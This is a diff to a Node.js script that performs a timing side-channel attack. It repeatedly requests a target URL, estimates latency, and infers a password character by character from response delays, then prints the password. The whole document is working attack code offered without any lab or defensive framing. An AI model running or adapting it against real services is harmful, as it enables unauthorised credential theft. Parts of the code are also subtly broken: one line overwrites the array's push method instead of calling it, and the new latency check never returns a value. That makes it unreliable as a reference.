@@ -11,14 +11,17 @@ let exampleCharSetPointer = 0;
 let sizedMatchedTimes = 0;
 let charIndexMatchedTimes = 0;
 let establishConnectionRequestTimes = 0;
-let latency = 100;
+let connectionLatencyReestablishedTimes = 0;
+let latency = 0;
+let STATE_RECALCULATE_LATENCY = false;
 
-const connectionEstablishmentResponseTimes = [];
-const sleepDiffThreshold = 200;
-const stableConnectionBestFiveResponseTimeDifferenceThreshold = 500;
+const serverResponseTimes = [];
+const sleepDiffThreshold = 300;
+const stableConnectionBestFiveResponseTimeDifferenceThreshold = 300;
 const matchedTimesThreshold = 10;
 const establishConnectionRequestThreshold = 10;
 const exampleCharSetLength = exampleCharSet.length - 1;
+
 
 const getNextFromExampleCharSet = () => exampleCharSet[exampleCharSetPointer++];
 const isLastCharInExampleCharSet = () => exampleCharSetLength === exampleCharSetPointer;
@@ -48,7 +51,6 @@ const generatePassword = () => {
     }
 };
 const calculateSizeMatched = (diff) => diff > latency + sleepDiffThreshold;
-// const calculateSizeMatched = (diff) => diff > sleepDiffThreshold;
 
 const reset = () => {
     password = exampleCharSet[0];
@@ -58,7 +60,30 @@ const reset = () => {
     charIndexMatchedTimes = 0;
 };
 
+const shouldRecalculateLatency = (diff) => {
+    const strangeLatencyDiffOccured = diff - serverResponseTimes[serverResponseTimes.length-1] > sleepDiffThreshold;
+    if (strangeLatencyDiffOccured) {
+        STATE_RECALCULATE_LATENCY = true;
+        console.warn(`strangeLatencyDiffOccured.
+        diff: ${diff}
+        last server response time: ${serverResponseTimes[serverResponseTimes.length-1]}
+        sleepDiffThreshold: ${sleepDiffThreshold}
+        diff - last responseTime was bigger then threshold (${diff - serverResponseTimes[serverResponseTimes.length-1]}).`);
+        if (connectionLatencyReestablishedTimes === establishConnectionRequestThreshold) {
+            STATE_RECALCULATE_LATENCY = false;
+            connectionLatencyReestablishedTimes = 0;
+            latency = diff - serverResponseTimes[serverResponseTimes.length-1] - sleepDiffThreshold;
+        }
+    } else if (STATE_RECALCULATE_LATENCY) {
+        connectionLatencyReestablishedTimes++;
+    }
+
+    serverResponseTimes.push=(diff);
+};
 const calculateCharIndexMatched = (diff) => {
+    if (shouldRecalculateLatency(diff)) {
+        return false;
+    }
     let calcThreshold = latency + (charIndex + 2) * sleepDiffThreshold;
     // let calcThreshold = (charIndex + 2) * sleepDiffThreshold;
     if (diff < sleepDiffThreshold) {
@@ -73,24 +98,26 @@ const calculateCharIndexMatched = (diff) => {
 async function establishStableConnection() {
     const startTime = process.hrtime();
     await fetch(URL, getFetchOptions());
-    connectionEstablishmentResponseTimes.push(getDiff(startTime));
+    serverResponseTimes.push(getDiff(startTime));
 
     if (establishConnectionRequestTimes++ < establishConnectionRequestThreshold) {
         return await establishStableConnection();
     }
-    connectionEstablishmentResponseTimes.sort((a, b) => a - b);
-    let l = connectionEstablishmentResponseTimes.length - 1;
-    const establishedConnectResponseTimeDifference = connectionEstablishmentResponseTimes[l] - connectionEstablishmentResponseTimes[l - 5];
+    serverResponseTimes.sort((a, b) => a - b);
+    let l = serverResponseTimes.length - 1;
+    const establishedConnectResponseTimeDifference = serverResponseTimes[l] - serverResponseTimes[l - 5];
     if (establishedConnectResponseTimeDifference > stableConnectionBestFiveResponseTimeDifferenceThreshold) {
         console.error(`could not establish a solid, stable connection between the server. From (${establishConnectionRequestThreshold}) requests fired to server the difference between the best 5 was: ${establishedConnectResponseTimeDifference}. Shut down, try again later.`);
         process.exit(0);
     }
+    latency = sleepDiffThreshold - serverResponseTimes[0];
+    latency = latency < 0 ? 10 : latency;
     console.log(
         `Established stable connection between the server.
         From (${establishConnectionRequestThreshold}) requests fired to server the difference between the best 5 was: ${establishedConnectResponseTimeDifference}.
-        connectionEstablishmentResponseTimes: ${JSON.stringify(connectionEstablishmentResponseTimes)} ms.
+        serverResponseTimes: ${JSON.stringify(serverResponseTimes)} ms.
+        latency: ${JSON.stringify(latency)} ms.
         Starting the timing attack.`);
-    latency = connectionEstablishmentResponseTimes[0] / 2;
     await test();
 }
 
@@ -117,7 +144,7 @@ async function test() {
         console.warn(`password: ${password}`);
         process.exit(0);
     } else {
-        await sleep(100);
+        await sleep(50);
         let sizeMatched = calculateSizeMatched(diff);
         if (sizeMatched && sizedMatchedTimes !== matchedTimesThreshold) {
             sizedMatchedTimes++;
@@ -143,8 +170,8 @@ async function test() {
         // if (password.length === 6) {
         //     console.log(`password: ${password} (length: 6)`);
         // }
-        // console.log(`password: ${password}`);
-        // console.log(`diff: ${diff}`);
+        console.log(`password: ${password}`);
+        console.log(`diff: ${diff}`);
         // }
         // console.log(`diff: ${diff}`);
         // console.log(`sizeMatched: ${sizeMatched} (${sizedMatchedTimes})`);
@@ -152,4 +179,6 @@ async function test() {
     }
 }
 
-establishStableConnection();
+(async function (){
+    await establishStableConnection();
+})();
